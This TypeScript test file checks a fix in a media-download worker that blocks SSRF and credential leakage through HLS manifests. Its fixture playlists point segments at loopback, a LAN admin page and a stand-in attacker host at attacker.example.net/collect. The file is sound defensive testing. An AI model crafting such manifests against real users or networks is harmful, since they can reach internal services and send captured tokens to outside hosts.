/**
 * Original claim under test: the download worker fetched *every* segment URL resolved out of a
 * manifest — including absolute cross-origin URIs — with `headersForPlan(plan.headers)` attached,
 * and no `isSafeSegmentUrl` / private-network / origin-scope gate existed anywhere in the worker path.
 *
 * Post-fix behavior enforced below:
 *   1. Private-network descriptors (loopback, LAN, link-local) are rejected at the gate unless
 *      same-origin with the manifest — zero fetch attempts, structural error naming the host.
 *   2. Cross-origin descriptors (legitimate CDN pattern) are fetched with NO credential-bearing
 *      headers — `Authorization`, `X-Api-Key`, and other captured headers are scoped to the
 *      origin they were captured from.
 *   3. Same-origin segments still get captured headers (legitimate behavior preserved).
 *   4. Query-param carry is origin-scoped: cross-origin segments do NOT inherit the master URL's
 *      signed token query (A6 mitigation).
 *   5. Same-origin private-network hosts (e.g., http://192.168.1.10:8096 local media server) are
 *      allowed — the page itself runs on that origin and can legitimately fetch its own resources.
 */
import { describe, expect, it, vi } from "vitest";
import { DownloadWorker, toTransferSegments } from "../src/extension/download-worker.js";
import type { DownloadPlan } from "../src/core/types.js";
import type { BroadcastChannelLike } from "../src/extension/gateways.js";
import type { FetchLike } from "../src/transfer/fetch.js";
import { headersForPlan } from "../src/transfer/fetch.js";
import { parsePlaylist } from "../src/manifests/hls.js";
import { buildSegmentRequests } from "../src/transfer/assemble.js";
import { createFakeOpfs, createFetch } from "./helpers/transfer-fakes.js";

const encoder = new TextEncoder();

/** Public-origin manifest that `manifestEnrichmentAllowed` would happily bless. */
const MANIFEST_URL = "https://cdn.example.com/stream/master.m3u8?token=page-signed&sig=abc123";

/** A hostile playlist: one legitimate segment + absolute URIs to loopback, LAN, attacker CDN. */
const HOSTILE_PLAYLIST = [
  "#EXTM3U",
  "#EXT-X-VERSION:3",
  "#EXT-X-TARGETDURATION:2",
  "#EXTINF:2.0,",
  "/stream/seg-0.ts",
  "#EXTINF:2.0,",
  "http://127.0.0.1:9090/metrics",
  "#EXTINF:2.0,",
  "http://192.168.1.1/admin/config",
  "#EXTINF:2.0,",
  "https://attacker.example.net/collect",
  "#EXT-X-ENDLIST",
].join("\n");

/** Attacker-only playlist: cross-origin segments with no private-network hosts. */
const ATTACKER_ONLY_PLAYLIST = [
  "#EXTM3U",
  "#EXT-X-VERSION:3",
  "#EXT-X-TARGETDURATION:2",
  "#EXTINF:2.0,",
  "https://attacker.example.net/seg-0.ts",
  "#EXTINF:2.0,",
  "https://attacker.example.net/seg-1.ts",
  "#EXT-X-ENDLIST",
].join("\n");

/** Same-origin LAN playlist: all segments on the same private-network origin as the manifest. */
const LAN_SAME_ORIGIN_MANIFEST = "http://192.168.1.10:8096/videos/stream.m3u8?session=abc";
const LAN_SAME_ORIGIN_PLAYLIST = [
  "#EXTM3U",
  "#EXT-X-VERSION:3",
  "#EXT-X-TARGETDURATION:2",
  "#EXTINF:2.0,",
  "/videos/seg-0.ts",
  "#EXTINF:2.0,",
  "/videos/seg-1.ts",
  "#EXT-X-ENDLIST",
].join("\n");

/** Headers observed on the page's own media traffic. */
const captured = new Headers({
  Authorization: "Bearer page-secret-token",
  "X-Api-Key": "sk-page-key-123",
  Referer: "https://cdn.example.com/watch",
  Cookie: "session=page-scope-only-never-replayed",
});

/** Query copied from the master whenever `carry_get_params` is on (6-Sol A6 behaviour). */
const CARRY = "?token=page-signed&sig=abc123";
const SEGMENT_BYTES = new Uint8Array(2048).fill(7);

const noopChannel = (): BroadcastChannelLike => ({
  postMessage: () => undefined,
  addEventListener: () => undefined,
  removeEventListener: () => undefined,
  close: () => undefined,
});

describe("header retention (pure)", () => {
  it("headersForPlan keeps credential-bearing page headers in the plan (only Cookie is dropped)", () => {
    const planHeaders = headersForPlan(captured);
    expect(planHeaders.get("authorization")).toBe("Bearer page-secret-token");
    expect(planHeaders.get("x-api-key")).toBe("sk-page-key-123");
    expect(planHeaders.get("cookie")).toBeNull();
    expect(planHeaders.get("referer")).toBeNull();
  });
});

describe("URL resolution with carry guard (pure)", () => {
  it("buildSegmentRequests does NOT carry master query to cross-origin segments (A6 mitigation)", () => {
    const parsed = parsePlaylist(HOSTILE_PLAYLIST, new URL(MANIFEST_URL));
    if (parsed.kind !== "media") throw new Error(`expected media playlist, got ${parsed.kind}`);
    const descriptors = buildSegmentRequests(toTransferSegments(parsed.segments), {
      masterUrl: new URL(MANIFEST_URL),
      carryGetParams: true,
    });
    expect(descriptors.map((d) => d.url)).toEqual([
      `https://cdn.example.com/stream/seg-0.ts${CARRY}`, // same-origin: carry applies
      `http://127.0.0.1:9090/metrics`, // cross-origin: NO carry
      `http://192.168.1.1/admin/config`, // cross-origin: NO carry
      `https://attacker.example.net/collect`, // cross-origin: NO carry
    ]);
  });
});

describe("private-network gate", () => {
  it("rejects private-network segment hosts with a structural error (zero fetch attempts)", async () => {
    const payloads = new Map<string, string | Uint8Array>([
      [MANIFEST_URL, HOSTILE_PLAYLIST],
    ]);
    const serving = createFetch(payloads);

    const calls: string[] = [];
    const fetchImpl: FetchLike = async (url, init) => {
      calls.push(url);
      return serving(url, init);
    };

    const { root } = createFakeOpfs();
    vi.spyOn(URL, "createObjectURL").mockReset().mockReturnValue("blob:u1-guard");
    const worker = new DownloadWorker({ channel: noopChannel(), fetchImpl, openRoot: async () => root });

    const plan: DownloadPlan = {
      download_id: "download_u1_guard_gate",
      headers: captured,
      headers_origin: new URL(MANIFEST_URL).origin,
      good_basename: "u1-guard",
      subdir: "",
      save_as: false,
      will_use_jsfetch: false,
      strategy: "m3u8_audio_video_one_source",
      url: new URL(MANIFEST_URL),
      carry_get_params: true,
      extension: "mp4",
      muxer: "mp4",
      is_youtube: false,
      throttle: false,
      cache: "default",
    };

    const result = await worker.runPlan(plan);

    // The download fails at the gate — no segments are fetched.
    expect(result.tag).toBe("Err");
    if (result.tag === "Err") {
      // Error names the refused host (not the full URL with tokens).
      expect(result.error).toMatch(/127\.0\.0\.1.*refused/i);
    }

    // Zero fetch attempts to loopback/LAN hosts.
    const loopback = calls.filter((url) => new URL(url).hostname === "127.0.0.1");
    const lan = calls.filter((url) => new URL(url).hostname === "192.168.1.1");
    expect(loopback).toHaveLength(0);
    expect(lan).toHaveLength(0);
  });
});

describe("cross-origin credential isolation", () => {
  it("fetches cross-origin segments with NO captured headers (attacker CDN gets empty headers)", async () => {
    const payloads = new Map<string, string | Uint8Array>([
      [MANIFEST_URL, ATTACKER_ONLY_PLAYLIST],
      ["https://attacker.example.net/seg-0.ts", SEGMENT_BYTES],
      ["https://attacker.example.net/seg-1.ts", SEGMENT_BYTES],
    ]);
    const serving = createFetch(payloads);

    interface RecordedCall {
      url: string;
      authorization: string | null;
      apiKey: string | null;
    }
    const calls: RecordedCall[] = [];
    const fetchImpl: FetchLike = async (url, init) => {
      const headers = new Headers(init?.headers);
      calls.push({
        url,
        authorization: headers.get("authorization"),
        apiKey: headers.get("x-api-key"),
      });
      return serving(url, init);
    };

    const { root } = createFakeOpfs();
    vi.spyOn(URL, "createObjectURL").mockReset().mockReturnValue("blob:u1-guard-iso");
    const worker = new DownloadWorker({ channel: noopChannel(), fetchImpl, openRoot: async () => root });

    const plan: DownloadPlan = {
      download_id: "download_u1_guard_isolation",
      headers: captured,
      headers_origin: new URL(MANIFEST_URL).origin,
      good_basename: "u1-guard-iso",
      subdir: "",
      save_as: false,
      will_use_jsfetch: false,
      strategy: "m3u8_audio_video_one_source",
      url: new URL(MANIFEST_URL),
      carry_get_params: false,
      extension: "mp4",
      muxer: "mp4",
      is_youtube: false,
      throttle: false,
      cache: "default",
    };

    const result = await worker.runPlan(plan);

    // The download completes successfully (cross-origin CDN pattern is legitimate).
    expect(result.tag).toBe("Ok");

    // Attacker segments were fetched, but with NO captured credentials.
    const attacker = calls.filter((call) => new URL(call.url).hostname === "attacker.example.net");
    expect(attacker.length).toBeGreaterThan(0);
    for (const call of attacker) {
      expect(call.authorization).toBeNull();
      expect(call.apiKey).toBeNull();
    }
  });
});

describe("same-origin preservation", () => {
  it("same-origin segments still get captured headers (legitimate behavior)", async () => {
    const sameOriginUrl = "https://cdn.example.com/stream/seg-0.ts";
    const payloads = new Map<string, string | Uint8Array>([
      [MANIFEST_URL, [
        "#EXTM3U",
        "#EXT-X-VERSION:3",
        "#EXT-X-TARGETDURATION:2",
        "#EXTINF:2.0,",
        "/stream/seg-0.ts",
        "#EXT-X-ENDLIST",
      ].join("\n")],
      [sameOriginUrl, SEGMENT_BYTES],
    ]);
    const serving = createFetch(payloads);

    interface RecordedCall {
      url: string;
      authorization: string | null;
      apiKey: string | null;
    }
    const calls: RecordedCall[] = [];
    const fetchImpl: FetchLike = async (url, init) => {
      const headers = new Headers(init?.headers);
      calls.push({
        url,
        authorization: headers.get("authorization"),
        apiKey: headers.get("x-api-key"),
      });
      return serving(url, init);
    };

    const { root } = createFakeOpfs();
    vi.spyOn(URL, "createObjectURL").mockReset().mockReturnValue("blob:u1-guard-same");
    const worker = new DownloadWorker({ channel: noopChannel(), fetchImpl, openRoot: async () => root });

    const plan: DownloadPlan = {
      download_id: "download_u1_guard_same_origin",
      headers: captured,
      headers_origin: new URL(MANIFEST_URL).origin,
      good_basename: "u1-guard-same",
      subdir: "",
      save_as: false,
      will_use_jsfetch: false,
      strategy: "m3u8_audio_video_one_source",
      url: new URL(MANIFEST_URL),
      carry_get_params: false,
      extension: "mp4",
      muxer: "mp4",
      is_youtube: false,
      throttle: false,
      cache: "default",
    };

    const result = await worker.runPlan(plan);

    expect(result.tag).toBe("Ok");

    // Same-origin segment got captured credentials.
    const sameOrigin = calls.filter((call) => call.url === sameOriginUrl);
    expect(sameOrigin).toHaveLength(1);
    expect(sameOrigin[0]?.authorization).toBe("Bearer page-secret-token");
    expect(sameOrigin[0]?.apiKey).toBe("sk-page-key-123");
  });
});

describe("same-origin LAN carve-out", () => {
  it("allows same-origin private-network hosts (local media server pattern)", async () => {
    const seg0Url = "http://192.168.1.10:8096/videos/seg-0.ts";
    const seg1Url = "http://192.168.1.10:8096/videos/seg-1.ts";
    const payloads = new Map<string, string | Uint8Array>([
      [LAN_SAME_ORIGIN_MANIFEST, LAN_SAME_ORIGIN_PLAYLIST],
      [seg0Url, SEGMENT_BYTES],
      [seg1Url, SEGMENT_BYTES],
    ]);
    const serving = createFetch(payloads);

    interface RecordedCall {
      url: string;
      authorization: string | null;
    }
    const calls: RecordedCall[] = [];
    const fetchImpl: FetchLike = async (url, init) => {
      const headers = new Headers(init?.headers);
      calls.push({
        url,
        authorization: headers.get("authorization"),
      });
      return serving(url, init);
    };

    const { root } = createFakeOpfs();
    vi.spyOn(URL, "createObjectURL").mockReset().mockReturnValue("blob:u1-guard-lan");
    const worker = new DownloadWorker({ channel: noopChannel(), fetchImpl, openRoot: async () => root });

    const lanHeaders = new Headers({
      Authorization: "Bearer lan-server-token",
    });

    const plan: DownloadPlan = {
      download_id: "download_u1_guard_lan",
      headers: lanHeaders,
      headers_origin: new URL(LAN_SAME_ORIGIN_MANIFEST).origin,
      good_basename: "u1-guard-lan",
      subdir: "",
      save_as: false,
      will_use_jsfetch: false,
      strategy: "m3u8_audio_video_one_source",
      url: new URL(LAN_SAME_ORIGIN_MANIFEST),
      carry_get_params: false,
      extension: "mp4",
      muxer: "mp4",
      is_youtube: false,
      throttle: false,
      cache: "default",
    };

    const result = await worker.runPlan(plan);

    // The download succeeds (same-origin LAN is allowed).
    expect(result.tag).toBe("Ok");

    // Segments were fetched with captured credentials (legitimate same-origin pattern).
    const segments = calls.filter((call) => call.url.includes("/videos/seg-"));
    expect(segments.length).toBeGreaterThan(0);
    for (const call of segments) {
      expect(call.authorization).toBe("Bearer lan-server-token");
    }
  });
});
